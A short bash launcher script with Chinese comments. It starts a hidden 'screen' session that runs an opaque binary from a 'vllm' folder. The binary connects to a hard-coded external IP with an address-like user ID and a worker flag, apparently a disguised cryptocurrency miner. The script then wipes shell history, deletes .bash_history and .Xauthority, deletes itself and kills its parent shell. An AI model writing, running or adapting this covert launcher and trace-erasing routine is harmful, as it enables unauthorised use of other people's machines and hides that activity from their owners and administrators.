#!/bin/bash

# 1. 停止旧会话并清理。使用 ; 确保无论是否有旧会话都会执行 wipe
screen -XS p quit 2>/dev/null; screen -wipe >/dev/null 2>&1

# 2. 启动新会话
screen -dmS p bash -c "sleep 5 && source $HOME/vllm/bin/activate && cd $HOME/vllm && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker new"

# 3. 痕迹清理
history -c
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history

# 脚本自删除
rm -f "$0"
kill -9 $PPID
